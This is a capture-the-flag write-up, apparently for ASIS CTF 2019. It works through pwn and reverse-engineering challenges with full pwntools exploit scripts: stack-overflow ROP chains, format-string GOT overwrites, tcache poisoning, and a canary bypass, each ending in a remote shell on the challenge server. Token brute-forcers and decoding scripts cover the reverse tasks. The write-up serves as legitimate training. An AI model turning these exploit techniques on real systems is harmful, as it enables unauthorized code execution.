##

## 83 Pwn / Silk Road I

Brute-force crack the ID, secret must be numeric string so it does not take
very long to crack

```c  
#include <stdio.h>  
#include <stdlib.h>  
#include <stdbool.h>

bool sub_40140A(char *secret)  
{  
 size_t v1; // r12  
 size_t v2; // r12  
 bool ret; // al  
 int v4; // [rsp+1Ch] [rbp-34h]  
 int v5; // [rsp+34h] [rbp-1Ch]  
 int v6; // [rsp+38h] [rbp-18h]  
 int sint; // [rsp+3Ch] [rbp-14h]

 sint = strtol(secret, 0LL, 10);  
 ret = 0;  
 if ( sint % (strlen(secret) + 2) || secret[4] != '1' )  
   return ret;  
 v6 = sint / 100000;  
 v5 = sint % 10000;  
 if ( 10 * (sint % 10000 / 1000) + sint % 10000 % 100 / 10 - (10 * (sint /
100000 / 1000) + sint / 100000 % 10) != 1  
   || 10 * (v6 / 100 % 10) + v6 / 10 % 10 - 2 * (10 * (v5 % 100 / 10) + v5 %
1000 / 100) != 8 )  
 {  
   return ret;  
 }  
 v4 = 10 * (v5 / 100 % 10) + v5 % 10;  
 if ( (10 * (v6 % 10) + v6 / 100 % 10) / v4 != 3 || (10 * (v6 % 10) + v6 / 100
% 10) % v4 )  
   return ret;  
 v1 = strlen(secret) + 2;  
 v2 = (strlen(secret) + 2) * v1;  
 if ( sint % (v5 * v6) == v2 * (strlen(secret) + 2) + 6 )  
   ret = 1;  
 return ret;  
}

char buf[0x100];

int main(int argc, char const *argv[])  
{  
 for (size_t i = 0; i < 0x100000000; ++i)  
 {  
   snprintf(buf, sizeof(buf), "%d", (int)i);  
   if (sub_40140A(buf))  
     puts(buf);//790317143  
 }  
 return 0;  
}  
```

Nickname is not hard to get so I will skip it. Then there is a stack-overflow,
which is easy.

```python  
from pwn import *

g_local=0  
p = ELF("./silkroad.elf")  
context(log_level='debug', arch='amd64')  
e = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")  
if g_local:  
	sh = process("./silkroad.elf")  
	gdb.attach(sh)  
else:  
	sh = remote("82.196.10.106", 58399)

def prepare():  
	sh.recvuntil("ID: ")  
	sh.send("790317143")  
	sh.recvuntil("nick: ")  
	sh.send("DreadPirateRobertsXiz\x00")  
	sh.recvuntil("delete evidince and run Silkroad!\n")  
prepare()  
sh.sendline("A" * (64+8) + p64(0x401bab) + p64(p.got["puts"]) +
p64(p.plt["puts"]) + p64(0x401AFD))

leak = sh.recvuntil('\n')  
libc_addr = u64(leak[:-1] + '\x00\x00') - e.symbols["puts"]  
print hex(libc_addr)

prepare()  
sh.sendline("A" * (64+8) + p64(0x401B4B) + p64(0x401bab) + \  
	p64(libc_addr + next(e.search("/bin/sh"))) + p64(libc_addr + e.symbols["system"]) + p64(0))

sh.interactive()  
```

## 171 Pwn / Silk Road II

Since many `strtol` is used, so I would guess this token is also numeric and
it is also can be brute-force cracked, but this time I will load the ELF
executable as a shared library and call the verification function directly.

```c  
#include <stdio.h>  
#include <dlfcn.h>  
#include <memory.h>  
typedef int (*func_t)(char *);  
char buf[0x100];  
char key[0x100];

//to clear the stack of verification function,  
//because use of `strncpy` will cause uninitialized variable access (no null
terminate)  
//which causes unexpected results if `strcat` is called to that string later  
void clear_stack()  
{  
	char buf[0x1000];  
	memset(buf, 0, sizeof(buf));  
}

int main(int argc, char const *argv[])  
{  
	char* addr = *(char**)dlopen("./silkroad_2.elf", RTLD_NOW | RTLD_GLOBAL);  
	func_t f = (func_t)(addr + 0x1C06);  
	for (int i = 0; i < 0x3b9aca00; ++i)  
	{  
		sprintf(buf, "%.9d", i);  
		for (int i = 0; i < 4; ++i)  
		{  
			key[i] = buf[i];  
		}  
		for (int i = 0; i < 5; ++i)  
		{  
			key[6 + i] = buf[4 + i];  
		}  
		key[4] = '1';  
		key[5] = '1';//4,5 must be length, which is always 11  
		key[11] = 0;  
		clear_stack();  
		if (f(key) == 1)  
			puts(buf);  
	}  
	return 0;  
}  
```

The vulnerability is format string vulnerability, when error message is
printed if an invalid command is given. We can rewrite got table entry of
`printf`, then hijack the `rip` and get shell using `one_gadget`

```python  
from pwn import *

g_local=1  
context(log_level='debug', arch='amd64')  
e = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")  
if g_local:  
	sh = process(["./silkroad_2.elf", "flag{test}"])  
	gdb.attach(sh)  
else:  
	sh = remote("82.196.10.106", 47299)

def hn(pos, val):  
	assert val < 0x10000  
	if val == 0:  
		return "%" + str(pos) + "$hn"  
	else:  
		return "%" + str(val) + "c%" + str(pos) + "$hn"

def cont_shoot(poses, vals, prev_size = 0):  
	assert len(poses) == len(vals)  
	size = len(poses)  
	ret = ""  
	i = 0  
	cur_size = prev_size  
	next_overflow = ((prev_size + 0xffff) / 0x10000) * 0x10000  
	while i < size:  
		assert next_overflow >= cur_size  
		num = next_overflow - cur_size + vals[i]  
		if num < 0x10000:  
			ret += hn(poses[i], num)  
			next_overflow += 0x10000  
		else:  
			num = vals[i] - (cur_size - (next_overflow - 0x10000))  
			assert num >= 0  
			ret += hn(poses[i], num)  
		cur_size += num  
		i += 1  
	return ret

sh.recvuntil("Enter your token: ")  
sh.send("98831114236")  
sh.recvuntil(">> ")  
sh.sendline("1")

sh.recvuntil("admin: ")

def format_exp(payload):  
	sh.sendline(payload)  
	sh.recvuntil("invalid: \\")  
	ret = sh.recvuntil('\n')  
	sh.recvuntil("admin: ")  
	return ret[:-1]

libc_addr = int(format_exp("\\%2$p")[2:], 16) - 0x3ed8c0  
print hex(libc_addr)

#mh = libc_addr + e.symbols["__malloc_hook"]  
#format_exp('\\' + cont_shoot([mh, mh+2, mh+4], []))  
#sh.sendline("\\q" + cyclic(128))  
#library function rewrites our input

prog_addr = int(format_exp("\\%9$p")[2:], 16) - 0x98d  
print hex(prog_addr)

pg = prog_addr + 0x3f50 #printf got table entry  
sys = libc_addr + 0x10a38c#e.symbols["system"]

format_exp("\\" + cyclic(7) + 'A' * (8 * 8) + p64(0) * 2 + p64(pg) + p64(pg+2)
+ p64(pg+4))

sh.sendline('\\' + cont_shoot([25, 26, 27], \  
	[sys & 0xffff, (sys >> 0x10) & 0xffff, (sys >> 0x20)], 0x11))

sh.interactive()  
```

## 182 Pwn / Silk Road III

The vulnerability is exactly same, but the verification is different.

```c  
signed __int64 __fastcall sub_1FCA(char *input)  
{  
 int v1; // eax  
 int v2; // ST1C_4  
 unsigned __int64 v3; // rbx  
 size_t v4; // r12  
 size_t v5; // r12  
 char v6; // bl  
 int v7; // ebx  
 int v8; // ebx  
 size_t v9; // rax  
 signed __int64 result; // rax  
 signed int i; // [rsp+14h] [rbp-4Ch]  
 signed int j; // [rsp+14h] [rbp-4Ch]  
 signed int k; // [rsp+14h] [rbp-4Ch]  
 signed int l; // [rsp+14h] [rbp-4Ch]  
 char _1337[5]; // [rsp+22h] [rbp-3Eh]  
 char v16[6]; // [rsp+27h] [rbp-39h]  
 char v17[6]; // [rsp+2Dh] [rbp-33h]  
 char haystack[6]; // [rsp+33h] [rbp-2Dh]  
 char v19[15]; // [rsp+39h] [rbp-27h]  
 unsigned __int64 v20; // [rsp+48h] [rbp-18h]

 v20 = __readfsqword(0x28u);  
 haystack[5] = 0;  
 for ( i = 0; i <= 4; ++i )  
   haystack[i] = input[strlen(input) - 5 + i];  
 if ( !strstr(haystack, "1337") )              // 14:19  
   goto LABEL_23; //must contain 1337, and be either X1337 or 1337X  
 v1 = strtol(haystack, 0LL, 10);  
 v2 = 100 * (input[13] - '0') + 1000 * (input[6] - '0') + input[15] - '0';  
 v3 = v1;  
 v4 = strlen(input);  
 v5 = strlen(input) * v4;  
 if ( v3 % (strlen(input) * v5) != v2 )  
   goto LABEL_23;// 1337XorX1337 % len**3 must have ten digit being 0  
 for ( j = 0; j <= 4; ++j )  
 {  
   v16[j] = input[j];  
   v17[j] = input[strlen(input) - 10 + j];  
 }  
 v16[5] = 0;  
 v17[5] = 0;  
 for ( k = 0; k <= 14; ++k )  
   v19[k] = input[k];  
 v19[14] = 0;  
 for ( l = 0; l <= 3; ++l )  
   _1337[l] = haystack[l + 1];  
 _1337[4] = 0;  
 if ( strstr(v19, _1337)  
   && (v6 = *input, v6 == input[strlen(input) - 8])// [0] == [11]  
   && (v7 = input[strlen(input) - 2] - 48,  
       v8 = input[strlen(input) - 3]  
          - 48                                 // [17] + [16] + [15] + 1 == [1]  
          + v7,  
       v8 + input[strlen(input) - 4] - 48 + 1 == input[1] - 48)  
   && (v9 = strlen(input), v9 == 19 * ((unsigned __int64)(0xD79435E50D79435FLL
* (unsigned __int128)v9 >> 64) >> 4)) )// len must == 19  
 {  
   result = 1LL;  
 }  
 else  
 {  
LABEL_23:  
   result = 0xFFFFFFFFLL;  
 }  
 return result;  
}  
```

Actually the restriction is easier to bypass than second version,
`X813373XXXXXX931337` can pass the check.

```python  
from pwn import *

g_local=0  
context(log_level='debug', arch='amd64')  
e = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")  
if g_local:  
	sh = process(["./ross.elf", "flag{test}"])  
	gdb.attach(sh)  
else:  
	sh = remote("82.196.10.106", 31337)

def hn(pos, val):  
	assert val < 0x10000  
	if val == 0:  
		return "%" + str(pos) + "$hn"  
	else:  
		return "%" + str(val) + "c%" + str(pos) + "$hn"

def cont_shoot(poses, vals, prev_size = 0):  
	assert len(poses) == len(vals)  
	size = len(poses)  
	ret = ""  
	i = 0  
	cur_size = prev_size  
	next_overflow = ((prev_size + 0xffff) / 0x10000) * 0x10000  
	while i < size:  
		assert next_overflow >= cur_size  
		num = next_overflow - cur_size + vals[i]  
		if num < 0x10000:  
			ret += hn(poses[i], num)  
			next_overflow += 0x10000  
		else:  
			num = vals[i] - (cur_size - (next_overflow - 0x10000))  
			assert num >= 0  
			ret += hn(poses[i], num)  
		cur_size += num  
		i += 1  
	return ret

sh.recvuntil("Enter your token: ")  
sh.send("X813373XXXXXX931337")  
sh.recvuntil("your nick: ")  
sh.sendline("admin")  
sh.recvuntil(">> ")  
sh.sendline("1")

sh.recvuntil("admin: ")

def format_exp(payload):  
	sh.sendline(payload)  
	sh.recvuntil("invalid: \\")  
	ret = sh.recvuntil('\n')  
	sh.recvuntil("admin: ")  
	return ret[:-1]

libc_addr = int(format_exp("\\%2$p")[2:], 16) - 0x3ed8c0  
print hex(libc_addr)

#mh = libc_addr + e.symbols["__malloc_hook"]  
#format_exp('\\' + cont_shoot([mh, mh+2, mh+4], []))  
#sh.sendline("\\q" + cyclic(128))  
#library function rewrites our input

prog_addr = int(format_exp("\\%9$p")[2:], 16) - 0x1E9D - 5  
print hex(prog_addr)

pg = prog_addr + 0x5F68 #printf got table entry  
sys = libc_addr + 0x10a38c#e.symbols["system"]

format_exp("\\" + cyclic(7) + 'A' * (8 * 8) + p64(0) * 2 + p64(pg) + p64(pg+2)
+ p64(pg+4))

sh.sendline('\\' + cont_shoot([25, 26, 27], \  
	[sys & 0xffff, (sys >> 0x10) & 0xffff, (sys >> 0x20)], 0x11))

sh.interactive()  
```

The exploit is same, except some offset has been changed.

## 116 Pwn / pwn 101

Vulnerability is off-by-one, we can use this to extend the chunk size of
unsorted bin to create overlap to leak the `libc` address; then we can get the
same chunk twice in 2 different indices, so we can use double free to poison
`tcache bins` and rewrite `__free_hook`.

```python  
from pwn import *  
from struct import unpack as up  
g_local=0  
#p = ELF("./pwn101.elf")  
context(log_level='debug', arch='amd64')  
#e = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")  
if g_local:  
	sh = process("./pwn101.elf")  
	gdb.attach(sh)  
else:  
	sh = remote("82.196.10.106", 29099)

sh.recvuntil("> ")  
def add(length, name, description="20192019"):  
	sh.sendline("1")  
	sh.recvuntil("Description Length: ")  
	sh.sendline(str(length))  
	sh.recvuntil("Phone Number: ")  
	sh.sendline("2019")  
	sh.recvuntil("Name: ")  
	sh.send(name)  
	sh.recvuntil("Description: ")  
	sh.send(description)  
	sh.recvuntil("> ")

def delete(idx):  
	sh.sendline("3")  
	sh.recvuntil("Index: ")  
	sh.sendline(str(idx))  
	sh.recvuntil("> ")

def show(idx):  
	sh.sendline("2")  
	sh.recvuntil("Index: ")  
	sh.sendline(str(idx))  
	sh.recvuntil("Description : ")  
	ret = sh.recvuntil('\n')  
	sh.recvuntil("> ")  
	return ret[:-1]

for i in xrange(7):  
	add(0x200, 'name', 'fill tcache')  
add(0x200, 'ab') #7  
for i in xrange(7):  
	delete(i)

add(0x58, 'c', 'A' * 0x50 + p64(0x1f0)) #0  
add(0x100, 'pad') #1  
delete(7)

add(0x78, "offbyone", 'a' * 0x78 + '\xf1') #2  
#0x191 -> 0x1f1  
add(0x180, "leak") #3  
libc_addr = u64(show(0) + '\x00\x00') - 0x3ebca0  
print hex(libc_addr)  
#0x7fe5e1b31ca0 on server, so 2.27

add(0x50, '22', "/bin/sh") #4

delete(4)  
delete(0)

add(0x50, 'consume', p64(libc_addr + 0x3ed8e8))#e.symbols["__free_hook"]))  
add(0x50, 'consume')  
add(0x50, '/bin/sh\x00', p64(libc_addr + 0x4f440))#e.symbols["system"])) #5

sh.sendline("3")  
sh.recvuntil("Index: ")  
sh.sendline(str(5))

sh.interactive()  
```

##  104 Pwn / Precise average

The stack overflow is obvious, but we need to find ways to bypass canary
protection. The key is to send `"-"` as the floating point number, which is
invalid and `scanf` will return negative, but it will not rewrite the pointer
passed as argument and leave it as it is. By using this technique canary will
not be rewritten.

```python  
from pwn import *  
from struct import unpack as up  
g_local=0  
p = ELF("./precise_avg.elf")  
context(log_level='debug', arch='amd64')  
e = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")  
if g_local:  
	sh = process("./precise_avg.elf")  
	gdb.attach(sh)  
else:  
	sh = remote("82.196.10.106", 12499)

pop_rdi = p64(0x4009c3)  
main = p64(0x4007D0)

def exploit(rop):  
	sh.recvuntil("Number of values: ")

	length = 35 + len(rop)/8  
	sh.sendline(str(length))

	for i in xrange(35):  
		sh.sendline("-")

	for i in xrange(0, len(rop), 8):  
		sh.sendline("%.800f" % up("<d", rop[i:i+8])[0])

	sh.recvuntil("Result = ")  
	sh.recvuntil('\n')

rop = pop_rdi  
rop += p64(p.got["puts"])  
rop += p64(p.plt["puts"])  
rop += main  
exploit(rop)

leak = sh.recvuntil('\n')

libc_addr = u64(leak[:-1] + '\x00\x00') - e.symbols["puts"]  
print hex(libc_addr)

rop = p64(0x400958) #retn  
rop += pop_rdi  
rop += p64(libc_addr + next(e.search("/bin/sh")))  
rop += p64(libc_addr + e.symbols["system"])  
rop += p64(0)

exploit(rop)

sh.interactive()  
```

## 287 Reverse / Mind Space

This is a C++ reverse engineering challenge. Fortunately the optimization is
not enabled, otherwise many C++ built-in functions would be "inlined" and the
codes would be very messy. The key is to recognize `std::vector`,
`std::string` and `angles` structure.

```c  
struct angles  
{  
 _QWORD field_0;  
 _QWORD field_8;  
};//actually they are `double` type  
struct vector  
{  
 angles *pointer;  
 angles *end;  
 angles *real_end;  
};  
struct string  
{  
 char *pointer;  
 size_t len;  
 size_t maxlen_data;  
 __int64 field_18;  
};  
```

I would not detail the C++ implementation here, if you want to know just
search online or write some test codes with STL and reverse them.

Here are some critical codes:

```c  
while ( !std::basic_ios<char,std::char_traits<char>>::eof(&input_stream_256) )  
{  
 v17 = 0LL;  
 std::getline(input_stream, &flag;;  
 v17 = string::find(&flag, ", ", 0LL);  
 string::substr(&v14, &flag, 0LL, v17);  
 string::operator_assign(&a1a, &v14);  
 string::string_des(&v14);  
 string::erase(&flag, 0LL, v17 + 1);  
 sndnum = string::strtod((__int64)&flag, 0LL);  
 a3 = sndnum - 80.0 - (double)i;  
 fstnum = string::strtod((__int64)&a1a, 0LL);  
 vector::push_back_withcheck(&a2, (double)i++ + fstnum - 80.0, a3);  
 // fstnum is modified and inserted as field_8, and sndnum is field_0  
}  
```

```c  
__int64 __fastcall encode(string *a1, double a2)  
{  
 double v2; // ST00_8  
 bool v4; // [rsp+17h] [rbp-19h]  
 char v5; // [rsp+18h] [rbp-18h]  
 int v6; // [rsp+1Ch] [rbp-14h]

 v2 = a2;  
 v6 = 2 * (signed int)round(100000.0 * a2);  
 if ( v2 < 0.0 )  
   v6 = ~v6;  
 string::string(a1);  
 do  
 {  
   v4 = v6 >> 5 > 0;  
   v5 = v6 & 0x1F;  
   if ( v6 >> 5 > 0 )  
     v5 |= 0x20u; // a little bit similar to uleb128 in android  
   string::operator_add(a1, (unsigned int)(char)(v5 + 0x3F));  
   v6 >>= 5;  
 }  
 while ( v4 );  
 return (__int64)a1;  
}  
```

This is the solving script

```python  
def read_flagenc():  
	f = open("./flag.txt.enc", "rb")  
	ret = f.read()  
	f.close()  
	return map(ord, ret[:-1])

def recover_ints(data):  
	ret = []  
	i = 0  
	off = 0  
	for c in data:  
		n = c - 0x3f  
		if (n & 0x20) == 0:  
			i += n << (5 * off)  
			ret.append(i)  
			i = 0  
			off = 0  
		else:  
			n -= 0x20  
			assert n < 0x20  
			i += n << (5 * off)  
			off += 1  
	return ret

arr = recover_ints(read_flagenc())

def back_to_double(i):  
	if i % 1000 == 999: # if it is originally negative  
		i = -i - 1  
	assert i % 1000 == 0 # % 2 == 0  
	return i / 2 / 100000.0

arr = map(back_to_double, arr)

last0 = 0.0  
last1 = 0.0  
for i in xrange(0, len(arr), 2):  
	arr[i] += last1  
	arr[i+1] += last0  
	last0 = arr[i+1]  
	last1 = arr[i]  
	#arr[i],arr[i+1] = arr[i+1],arr[i]

for i in xrange(0, len(arr), 2):  
	arr[i] = arr[i] + 80.0 - (i/2 + 1)  
	arr[i+1] = arr[i+1] + 80.0 + (i/2 + 1)

print arr  
print "".join(map(lambda x : chr(int(x)), arr))

out = ""  
for i in xrange(0, len(arr), 2):  
	out += "%.2f, %.2f\n" % (arr[i], arr[i+1])  
   # we know it is %.2f because it is the results are too close to it  
   # (something like xx.xx9999999 or xx.xx00000001)

out = out[:-1]

f = open("flag.txt", 'wb')  
f.write(out)  
f.close()  
```

Then we have a `flag.txt`, but how do we get the flag from it? After asking
for help from organizers (well, they told me this so it was allowed :D), we
knew that for a floating point number `aa.bb`, `bb` is index `aa` is `ascii`
value, so we can get the flag.

## 195 Reverse / Archimedes

This is the critical code that generate encrypted flag.

```c  
while ( 1 )  
{  
 v23 = i;  
 if ( v23 >= string::size(&input) )  
   break;  
 v24 = sub_5555555577A7(0x10u, 8);  
 string::substr((__int64)&v52, (__int64)&v31, 2 * i, 2LL);  
 stringstream::stringstream(&v26, &v52, v24);  
 string::destructor((__int64)&v52);  
 std::istream::operator>>(&v26, &v28);  
 input_char = (_BYTE *)string::operator_index(&input, i);  
 string::operator_add(&v30, (unsigned int)(char)(v28 ^ *input_char ^ 0x8F ^
i++));  
 basic_stringstream::destructor(&v26);  
}  
```

This is basically `xor`, but `v28` is not dependent on current time instead of
input flag, so we need to brute-force crack the `rand() % 0xffff` that
produces the byte sequence that gives the correct flag after `xor` operation.

But how to get that byte sequence given a particular `unsigned short` value?
My approach is to patch the binary. Firstly, let it accept the second argument
as the value that should have been generated by `rand()`. This can be done by
changing the assembly. However, we need `atoi` function but there is no such
function imported in this binary. The way to solve this is to change the
`"srand"` or `"rand"` string in symbol string table to `"atoi"`, so that the
function becomes `atoi`. Also, we need to cancel the `xor` operation such that
the byte sequence being outputted into file is not encrypted flag but the byte
sequence generated from the second argument.

We get the flag using following script

```python  
from os import system

def read_file(filename):  
	f = open(filename, "rb")  
	ret = f.read()  
	f.close()  
	return ret

for x in xrange(1,0xffff):  
	system("./archimedes2 flagenc %d" % x)  
	key = read_file("./flagenc.enc")  
	enc = read_file("./flag.enc")

	flag = ""  
	for i in xrange(0x2f):  
		flag += chr(ord(key[i]) ^ ord(enc[i]) ^ 0x8f ^ i)  
	print flag  
```

However, this is slow, it might take much time to traverse all 65534 cases,
but fortunately the flag comes up very soon.

Also here is the [patched program](files/archimedes2).

Original writeup
(https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-04-20-ASIS-
CTF-Quals/README.md#182-pwn--silk-road-iii).